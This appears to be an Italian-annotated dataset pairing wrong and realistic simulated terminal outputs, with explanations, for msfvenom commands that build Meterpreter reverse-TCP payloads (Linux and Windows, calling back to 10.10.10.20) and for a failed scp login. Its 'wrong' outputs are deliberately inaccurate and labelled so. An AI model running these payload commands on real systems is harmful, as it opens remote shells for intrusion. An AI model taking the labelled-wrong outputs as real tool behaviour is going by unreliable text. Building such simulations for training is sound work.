output_sbagliato:
`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.10.20 lport=4444 -o payload.elf`


Generated a 4096 byte exectable for the target architecture, but this p
ayload will not be a good native code since it was generated in a 64bits s
ystem...

Payload size: 4096 bytes
output_corretto:
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Saved as: payload.elf
motivo: L’output simulato contiene un warning generico che msfvenom normalmente non stampa. L’output reale dovrebbe riportare la dimensione reale del payload (es: ‘Payload size: 123 bytes’) e la conferma del salvataggio file (‘Saved as: payload.elf’).

output_sbagliato:
`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.10.20 lport=4444 -o payload.elf` 
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the target framework 
[-] No arch selected, selecting arch: x86 from the target framework

---

Assembly:
nop
xor eax,eax
mov al,0x5a
xchg eax,edx

output_corretto:
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Saved as: payload.elf
motivo: L'output generato include una sezione Assembly che msfvenom normalmente non mostra in output quando si esporta su file. Inoltre manca la riga di conferma "Saved as: payload.elf" e il payload size reale è tipicamente intorno ai 100-200 bytes per questo payload.

output_sbagliato:
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.20 lport=4444 -f exe -o payload.exe
``` 
[-] lhost must be a valid IP address or a resolvable hostname, not '10.10.10.20'
[-] lport must be a valid number, not '4444'
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.18 lport=443 -f exe -o payload.exe
``` 
Payload size: 4096 bytes
Final size of exe: 7168 bytes
Saved as: payload.exe
``` 
```
output_corretto:
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 386 bytes
Final size of exe: 73802 bytes
Saved as: payload.exe
motivo: L’output simulato mostra un errore su LHOST e LPORT anche se sono valori validi. In realtà, msfvenom accetta correttamente ‘10.10.10.20’ e ‘4444’.

output_corretto:
mario.rossi@shopcorp.local's password:
Permission denied, please try again.
mario.rossi@shopcorp.local's password:
Permission denied, please try again.
mario.rossi@shopcorp.local's password:
Permission denied (publickey,password).
motivo: L’output generato contiene messaggi di errore multipli e non realistici per una sola esecuzione di scp. Di solito, viene mostrato solo un errore per volta (es: “Permission denied”), e non si vedono stringhe come “exit status 1” stampate su schermo.
